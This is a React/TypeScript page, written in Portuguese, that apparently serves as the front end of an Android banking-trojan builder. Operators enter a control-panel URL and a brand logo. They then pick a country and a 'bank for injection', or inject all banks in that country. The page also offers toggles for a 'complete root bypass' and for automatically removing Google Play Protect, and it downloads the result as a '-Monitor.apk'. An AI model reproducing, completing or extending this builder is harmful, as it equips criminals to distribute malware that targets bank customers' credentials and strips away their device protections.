import { useAuth } from "@/_core/hooks/useAuth";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Checkbox } from "@/components/ui/checkbox";
import { Loader2, Download, X, Shield, ShieldCheck } from "lucide-react";
import { getLoginUrl } from "@/const";
import { useState, useEffect } from "react";
import { trpc } from "@/lib/trpc";
import { useNavigate } from "react-router-dom";
import { BANKS_BY_COUNTRY, COUNTRIES_SORTED, getBanksByCountry, getBankById } from "../../../shared/banks";
import { buildPackageName, sanitizeAppName, toOptionalValidLogoUrl, toRequiredValidUrl, type DeliveryMode } from "@/lib/apk-builder";

export default function APKBuilderPage() {
  const { user, loading, isAuthenticated, logout } = useAuth();
  const [companyName, setCompanyName] = useState('FazTudo');
  const [companyUrl, setCompanyUrl] = useState('https://faztudo.com.br');
  const [logoUrl, setLogoUrl] = useState('https://via.placeholder.com/150');
  const [versionName, setVersionName] = useState('1.0.0');
  const [versionCode, setVersionCode] = useState(1);
  const [selectedCountry, setSelectedCountry] = useState('Brasil');
  const [selectedBankId, setSelectedBankId] = useState('bb');
  const [enableRootBypass, setEnableRootBypass] = useState(true);
  const [enablePlayProtectBypass, setEnablePlayProtectBypass] = useState(true);
  const [injectAllCountryBanks, setInjectAllCountryBanks] = useState(false);
  const [deliveryMode, setDeliveryMode] = useState<DeliveryMode>('auto');
  const [isBuilding, setIsBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState(0);
  const [downloadUrl, setDownloadUrl] = useState<string | null>(null);
  const [buildId, setBuildId] = useState<string | null>(null);

  const navigate = useNavigate();
  const generateAPK = trpc.apk.generate.useMutation();
  const capabilities = trpc.apk.capabilities.useQuery();
  const buildStatusQuery = trpc.apk.status.useQuery(
    { buildId: buildId ?? "" },
    {
      enabled: !!buildId && isBuilding,
      refetchInterval: 2000,
    }
  );

  const handleBuildAPK = async () => {
    if (!companyName.trim() || !companyUrl.trim()) {
      alert('Por favor, preencha todos os campos');
      return;
    }

    const selectedBank = getBankById(selectedBankId);
    if (!selectedBank) {
      alert('Por favor, selecione um banco válido');
      return;
    }

    setIsBuilding(true);
    setBuildProgress(0);

    try {
      const normalizedPanelUrl = toRequiredValidUrl(companyUrl);
      const normalizedLogoUrl = toOptionalValidLogoUrl(logoUrl);
      const selectedBankName = injectAllCountryBanks
        ? `Todos os bancos (${selectedCountry})`
        : selectedBank.name;

      if (!normalizedPanelUrl) {
        alert('URL do painel invalida. Exemplo: https://painel.suaempresa.com');
        setIsBuilding(false);
        return;
      }
      
      const result = await generateAPK.mutateAsync({
        panelUrl: normalizedPanelUrl,
        appName: sanitizeAppName(companyName),
        packageName: buildPackageName(companyName),
        versionName,
        versionCode,
        bankId: injectAllCountryBanks ? `all-${selectedCountry.toLowerCase().replace(/\s+/g, '-')}` : selectedBank.id,
        bankCountry: selectedBank.country,
        bankName: selectedBankName,
        logoUrl: normalizedLogoUrl,
        enableRootBypass,
        enablePlayProtectBypass,
        deliveryMode,
      });

      setBuildId(result.buildId);
      setBuildProgress(10);
    } catch (error) {
      alert('Erro ao iniciar geração do APK');
      setIsBuilding(false);
    }
  };

  const status = buildStatusQuery.data;

  useEffect(() => {
    if (!status || !buildId || !isBuilding) return;
    if (status.status !== 'completed' || !status.downloadUrl) return;

    setDownloadUrl(status.downloadUrl);
    setIsBuilding(false);
    setBuildProgress(100);

    const timer = window.setTimeout(() => {
      const link = document.createElement('a');
      link.href = status.downloadUrl!;
      link.download = `${companyName}-Monitor.apk`;
      link.click();
      navigate(
        `/apk-panel?buildId=${buildId}&logo=${encodeURIComponent(logoUrl)}&name=${encodeURIComponent(companyName)}&url=${encodeURIComponent(companyUrl)}`
      );
    }, 1000);

    return () => window.clearTimeout(timer);
  }, [status, buildId, isBuilding, companyName, companyUrl, logoUrl, navigate]);

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="animate-spin w-8 h-8" />
      </div>
    );
  }

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-slate-900 to-slate-800">
        <div className="text-center">
          <h1 className="text-3xl font-bold text-white mb-4">Bem-vindo</h1>
          <p className="text-slate-400 mb-8">Faça login para continuar</p>
          <Button
            onClick={() => (window.location.href = getLoginUrl())}
            className="bg-blue-600 hover:bg-blue-700 text-white"
          >
            Entrar
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-slate-900 p-4 md:p-8">
      <div className="max-w-4xl mx-auto">
        <div className="mb-8">
          <Button
            onClick={logout}
            variant="outline"
            className="border-red-400/30 text-red-300 hover:bg-red-900/20"
          >
            Sair
          </Button>
        </div>

        <div className="bg-slate-900 border border-cyan-400/30 rounded-lg overflow-hidden">
          <div className="bg-slate-900 border-b border-cyan-400/30 p-6">
            <h1 className="text-3xl font-bold text-cyan-300">🔨 APK Builder</h1>
            <p className="text-slate-400 mt-2">Gere seu APK customizado com sua marca</p>
          </div>

          <div className="p-6">
            <div className="grid md:grid-cols-2 gap-8">
              {/* Formulário */}
              <div>
                <h3 className="text-lg font-bold text-cyan-300 mb-6">📋 Informações da Empresa</h3>

                <div className="mb-4">
                  <label className="block text-sm font-medium text-slate-300 mb-2">
                    Nome da Empresa *
                  </label>
                  <Input
                    type="text"
                    placeholder="Ex: FazTudo"
                    value={companyName}
                    onChange={(e) => setCompanyName(e.target.value)}
                    disabled={isBuilding}
                    className="bg-slate-700/50 border-cyan-400/30 text-white"
                  />
                </div>

                <div className="mb-4">
                  <label className="block text-sm font-medium text-slate-300 mb-2">
                    URL da Empresa *
                  </label>
                  <Input
                    type="url"
                    placeholder="Ex: painel.suaempresa.com"
                    value={companyUrl}
                    onChange={(e) => setCompanyUrl(e.target.value)}
                    disabled={isBuilding}
                    className="bg-slate-700/50 border-cyan-400/30 text-white"
                  />
                  <p className="text-xs text-slate-500 mt-1">Se nao comecar com http/https, adicionamos https:// automaticamente.</p>
                </div>

                <div className="mb-6">
                  <label className="block text-sm font-medium text-slate-300 mb-2">
                    Logo da Empresa (URL)
                  </label>
                  <Input
                    type="url"
                    placeholder="Ex: https://..."
                    value={logoUrl}
                    onChange={(e) => setLogoUrl(e.target.value)}
                    disabled={isBuilding}
                    className="bg-slate-700/50 border-cyan-400/30 text-white"
                  />
                </div>

                <div className="mb-4">
                  <label className="block text-sm font-medium text-slate-300 mb-2">
                    País do Banco *
                  </label>
                  <Select
                    value={selectedCountry}
                    onValueChange={(value) => {
                      setSelectedCountry(value);
                      const banksInCountry = getBanksByCountry(value);
                      if (banksInCountry.length > 0) {
                        setSelectedBankId(banksInCountry[0].id);
                      }
                    }}
                    disabled={isBuilding}
                  >
                    <SelectTrigger className="bg-slate-700/50 border-cyan-400/30 text-white">
                      <SelectValue placeholder="Selecione o país" />
                    </SelectTrigger>
                    <SelectContent className="bg-slate-800 border-cyan-400/30">
                      {COUNTRIES_SORTED.map((country: string) => (
                        <SelectItem key={country} value={country} className="text-white hover:bg-slate-700">
                          {country}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                <div className="mb-6">
                  <label className="block text-sm font-medium text-slate-300 mb-2">
                    Banco para Injeção *
                  </label>
                  <Select
                    value={selectedBankId}
                    onValueChange={setSelectedBankId}
                    disabled={isBuilding || injectAllCountryBanks}
                  >
                    <SelectTrigger className="bg-slate-700/50 border-cyan-400/30 text-white">
                      <SelectValue placeholder="Selecione o banco" />
                    </SelectTrigger>
                    <SelectContent className="bg-slate-800 border-cyan-400/30">
                      {getBanksByCountry(selectedCountry).map((bank: { id: string; name: string }) => (
                        <SelectItem key={bank.id} value={bank.id} className="text-white hover:bg-slate-700">
                          {bank.name}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                <div className="mb-4">
                  <label className="flex items-center space-x-2">
                    <input
                      type="checkbox"
                      checked={injectAllCountryBanks}
                      onChange={(e) => setInjectAllCountryBanks(e.target.checked)}
                      disabled={isBuilding}
                      className="rounded border-cyan-400/30 bg-slate-800/50"
                    />
                    <span className="text-sm font-medium text-slate-300">Injetar todos os bancos do país selecionado</span>
                  </label>
                </div>

                <div className="mb-6">
                  <label className="block text-sm font-medium text-slate-300 mb-2">Origem do Link APK</label>
                  <select
                    value={deliveryMode}
                    onChange={(e) => setDeliveryMode(e.target.value as DeliveryMode)}
                    disabled={isBuilding}
                    className="w-full px-3 py-2 bg-slate-700/50 border border-cyan-400/30 text-white rounded-md focus:outline-none focus:border-cyan-400"
                  >
                    <option value="auto">Automatico (EAS -&gt; Storage -&gt; Local)</option>
                    <option value="eas">EAS</option>
                    <option value="storage">Storage</option>
                    <option value="local">Local (fallback)</option>
                  </select>
                </div>

                <div className="mb-4">
                  <label className="flex items-center space-x-2">
                    <input
                      type="checkbox"
                      checked={enableRootBypass}
                      onChange={(e) => setEnableRootBypass(e.target.checked)}
                      disabled={isBuilding}
                      className="rounded border-cyan-400/30 bg-slate-800/50"
                    />
                    <Shield className="w-4 h-4 text-cyan-400" />
                    <span className="text-sm font-medium text-slate-300">Bypass Root Completo</span>
                  </label>
                  <p className="text-xs text-slate-500 mt-1">Permite execução em dispositivos com root</p>
                </div>

                <div className="mb-6">
                  <label className="flex items-center space-x-2">
                    <input
                      type="checkbox"
                      checked={enablePlayProtectBypass}
                      onChange={(e) => setEnablePlayProtectBypass(e.target.checked)}
                      disabled={isBuilding}
                      className="rounded border-cyan-400/30 bg-slate-800/50"
                    />
                    <ShieldCheck className="w-4 h-4 text-cyan-400" />
                    <span className="text-sm font-medium text-slate-300">Desinstalar Play Protect Automaticamente</span>
                  </label>
                  <p className="text-xs text-slate-500 mt-1">Remove proteção do Google Play automaticamente</p>
                </div>

                <Button
                  onClick={handleBuildAPK}
                  disabled={isBuilding}
                  className="w-full bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-700 hover:to-cyan-700 text-white font-bold py-3 rounded-lg disabled:opacity-50"
                >
                  {isBuilding ? (
                    <>
                      <div className="animate-spin inline-block mr-2 w-4 h-4 border-2 border-white border-t-transparent rounded-full"></div>
                      Gerando APK...
                    </>
                  ) : (
                    <>
                      <Download className="inline-block mr-2 w-4 h-4" />
                      ▶ Build APK
                    </>
                  )}
                </Button>

                {isBuilding && (
                  <div className="mt-4">
                    <div className="flex justify-between text-xs text-slate-400 mb-2">
                      <span>Progresso</span>
                      <span>{Math.round(buildProgress)}%</span>
                    </div>
                    <div className="w-full bg-slate-700/50 rounded-full h-2">
                      <div
                        className="bg-gradient-to-r from-blue-500 to-cyan-500 h-full transition-all"
                        style={{ width: `${buildProgress}%` }}
                      ></div>
                    </div>
                  </div>
                )}

                <div className="mt-4 grid grid-cols-1 md:grid-cols-3 gap-3 text-xs">
                  <div className="rounded-lg border border-cyan-400/20 p-3 bg-slate-900/30">
                    <p className="text-slate-200 font-semibold">EAS</p>
                    <p className={capabilities.data?.eas.available ? 'text-green-300' : 'text-red-300'}>
                      {capabilities.data?.eas.available ? 'Configurado' : 'Nao configurado'}
                    </p>
                  </div>
                  <div className="rounded-lg border border-cyan-400/20 p-3 bg-slate-900/30">
                    <p className="text-slate-200 font-semibold">Storage</p>
                    <p className={capabilities.data?.storage.available ? 'text-green-300' : 'text-red-300'}>
                      {capabilities.data?.storage.available ? 'Configurado' : 'Nao configurado'}
                    </p>
                  </div>
                  <div className="rounded-lg border border-cyan-400/20 p-3 bg-slate-900/30">
                    <p className="text-slate-200 font-semibold">Local</p>
                    <p className="text-green-300">Disponivel</p>
                  </div>
                </div>

                {downloadUrl && (
                  <div className="mt-4 p-3 bg-green-900/20 border border-green-400/30 rounded-lg">
                    <p className="text-green-300 text-sm">✅ APK gerado com sucesso!</p>
                    <Button
                      onClick={() => {
                        const link = document.createElement('a');
                        link.href = downloadUrl;
                        link.download = `${companyName}-Monitor.apk`;
                        link.click();
                      }}
                      className="w-full mt-3 bg-green-600 hover:bg-green-700 text-white font-bold py-2 rounded"
                    >
                      📥 Baixar APK
                    </Button>
                  </div>
                )}
              </div>

              {/* Prévia */}
              <div>
                <h3 className="text-lg font-bold text-cyan-300 mb-6">👁️ Prévia do App</h3>

                <div className="flex justify-center">
                  <div className="w-64 bg-slate-700 rounded-3xl border-8 border-slate-800 overflow-hidden shadow-2xl">
                    <div className="bg-black h-6 flex justify-center">
                      <div className="w-32 h-5 bg-black rounded-b-2xl"></div>
                    </div>

                    <div className="bg-gradient-to-br from-slate-900 to-blue-900 p-4 min-h-96 flex flex-col items-center justify-center">
                      {logoUrl && (
                        <img
                          src={logoUrl}
                          alt="Logo"
                          className="w-20 h-20 rounded-lg object-cover border-2 border-cyan-400/50 mb-4"
                          onError={(e) => {
                            e.currentTarget.style.display = 'none';
                          }}
                        />
                      )}

                      <h4 className="text-lg font-bold text-cyan-300 text-center mb-2">
                        {companyName || 'Seu App'}
                      </h4>

                      <p className="text-xs text-slate-400 text-center break-all mb-6">
                        {companyUrl || 'https://seu-site.com'}
                      </p>

                      <div className="bg-slate-800/50 border border-cyan-400/30 rounded-lg p-3 w-full text-center">
                        <p className="text-xs text-slate-300">✅ App pronto para instalar</p>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="mt-6 bg-slate-700/30 border border-cyan-400/20 rounded-lg p-4">
                  <h4 className="text-sm font-semibold text-cyan-300 mb-3">ℹ️ Informações</h4>
                  <ul className="space-y-2 text-xs text-slate-300">
                    <li>✓ APK customizado com sua marca</li>
                    <li>✓ Integrado ao seu painel</li>
                    <li>✓ Pronto para distribuir</li>
                    <li>✓ Suporte a múltiplos dispositivos</li>
                    <li>✓ Banco: {injectAllCountryBanks ? `Todos os bancos (${selectedCountry})` : getBankById(selectedBankId)?.name || 'Nao definido'}</li>
                    {enableRootBypass && <li>✓ Bypass Root Completo</li>}
                    {enablePlayProtectBypass && <li>✓ Desinstalação Automática do Play Protect</li>}
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
